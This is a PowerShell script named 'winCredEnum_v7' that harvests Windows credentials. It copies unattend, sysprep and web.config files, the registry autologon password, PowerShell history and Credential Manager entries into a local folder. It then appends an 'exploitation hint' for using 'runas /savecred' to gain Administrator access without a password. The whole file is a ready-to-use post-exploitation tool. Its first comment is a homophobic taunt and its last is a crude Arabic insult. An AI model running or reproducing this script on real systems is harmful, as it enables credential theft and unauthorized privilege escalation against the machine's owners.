# Why Are You GAY ?!
# Configuring the display policy to avoid issues during printing
$OutputEncoding = [System.Text.Encoding]::UTF8

Write-Host "[*] Starting winCredEnum_v7 For Credentials Enumeration..." -ForegroundColor Cyan
Write-Host "====================================================================="

# Create the output directory in the current path
$outputDir = ".\output"
if (!(Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir | Out-Null
    Write-Host "[+] Created directory: $outputDir" -ForegroundColor Green
} else {
    Write-Host "[*] Directory '$outputDir' already exists. Outputs will be saved there." -ForegroundColor Yellow
}

# List of all targeted sensitive files and paths
$targetFiles = @(
    "C:\Unattend.xml",
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\system32\sysprep.inf",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\inetpub\wwwroot\web.config",
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"
)

Write-Host "`n[*] Section 1: Extracting Sensitive Files..." -ForegroundColor Magenta
foreach ($file in $targetFiles) {
    if (Test-Path $file) {
        Write-Host "[+] FOUND: $file" -ForegroundColor Green
        $safeName = $file.Replace(":\", "_").Replace("\", "_") + ".txt"
        $destination = Join-Path $outputDir $safeName
        
        try {
            Get-Content $file -ErrorAction Stop | Out-File -FilePath $destination -Encoding utf8
            Write-Host "    [->] Content saved to: $destination" -ForegroundColor Gray
        } catch {
            Write-Host "    [-] Found the file but failed to read/save it." -ForegroundColor Yellow
        }
    } else {
        Write-Host "[-] NOT FOUND: $file" -ForegroundColor Red
    }
}

# Checking the automatic login feature in the system registry (Winlogon Autologon)
Write-Host "`n[*] Section 2: Checking Registry for Autologon..." -ForegroundColor Magenta
$winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
if (Test-Path $winlogonPath) {
    try {
        $logonInfo = Get-ItemProperty -Path $winlogonPath -ErrorAction Stop
        if ($logonInfo.DefaultPassword) {
            Write-Host "[!!!] WINLOGON AUTOLOGON CREDENTIALS FOUND!" -ForegroundColor Green
            $regDestination = Join-Path $outputDir "Registry_Autologon.txt"
            
            "User: $($logonInfo.DefaultUserName)" | Out-File -FilePath $regDestination -Encoding utf8
            "Pass: $($logonInfo.DefaultPassword)" | Out-File -FilePath $regDestination -Append -Encoding utf8
            if ($logonInfo.DefaultDomainName) { "Domain: $($logonInfo.DefaultDomainName)" | Out-File -FilePath $regDestination -Append -Encoding utf8 }
            
            Write-Host "    [->] Credentials saved to: $regDestination" -ForegroundColor Gray
        } else {
            Write-Host "[-] No Autologon password found in registry." -ForegroundColor Yellow
        }
    } catch {
        Write-Host "[-] Failed to read Winlogon registry key." -ForegroundColor Red
    }
}

# Checking the PowerShell command history (PSReadLine History)
Write-Host "`n[*] Section 3: Extracting PowerShell Console History..." -ForegroundColor Magenta
$historyDestination = Join-Path $outputDir "PowerShell_History.txt"
try {
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Write-Host "[+] FOUND PowerShell History File." -ForegroundColor Green
        Get-Content $historyPath | Out-File -FilePath $historyDestination -Encoding utf8
        Write-Host "    [->] Saved history to: $historyDestination" -ForegroundColor Gray
    } else {
        Write-Host "[-] PowerShell history file is empty or missing." -ForegroundColor Yellow
    }
} catch {
    $defaultHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $defaultHistory) {
        Write-Host "[+] FOUND PowerShell History File (Default Path)." -ForegroundColor Green
        Get-Content $defaultHistory | Out-File -FilePath $historyDestination -Encoding utf8
        Write-Host "    [->] Saved history to: $historyDestination" -ForegroundColor Gray
    } else {
        Write-Host "[-] Failed to retrieve PowerShell history." -ForegroundColor Red
    }
}

# Checking saved credentials management (cmdkey /list)
Write-Host "`n[*] Section 4: Checking Windows Credential Manager (cmdkey)..." -ForegroundColor Magenta
$cmdkeyDestination = Join-Path $outputDir "Cmdkey_Credentials.txt"
try {
    # Execute the command and store the output
    $cmdkeyOut = cmdkey /list
    
    # Checking if the output contains actual data
    if ($cmdkeyOut -match "Target") {
        Write-Host "[!!!] FOUND Saved Credentials in Windows Credential Manager!" -ForegroundColor Green
        
        # Write the original output to the file
        $cmdkeyOut | Out-File -FilePath $cmdkeyDestination -Encoding utf8
        
        # Adding the (Exploitation Hint)
        "`n=====================================================================" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
        "[+] EXPLOITATION HINT:" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
        "If you see a privileged user (e.g., Administrator) in the targets above," | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
        "you can execute commands as that user WITHOUT a password using the /savecred flag." | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
        "" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
        "Command syntax: runas /savecred /user:<USERNAME> cmd.exe" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
        "Example:        runas /savecred /user:Administrator cmd.exe" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8
        "=====================================================================" | Out-File -FilePath $cmdkeyDestination -Append -Encoding utf8

        Write-Host "    [->] Saved cmdkey output & Exploitation Hint to: $cmdkeyDestination" -ForegroundColor Gray
    } else {
        Write-Host "[-] No saved credentials found in cmdkey." -ForegroundColor Yellow
    }
} catch {
    Write-Host "[-] Failed to execute cmdkey." -ForegroundColor Red
}

Write-Host "`n====================================================================="
Write-Host "[*] Enumeration Complete! Check the 'output' directory." -ForegroundColor Cyan
# فصخ سروالك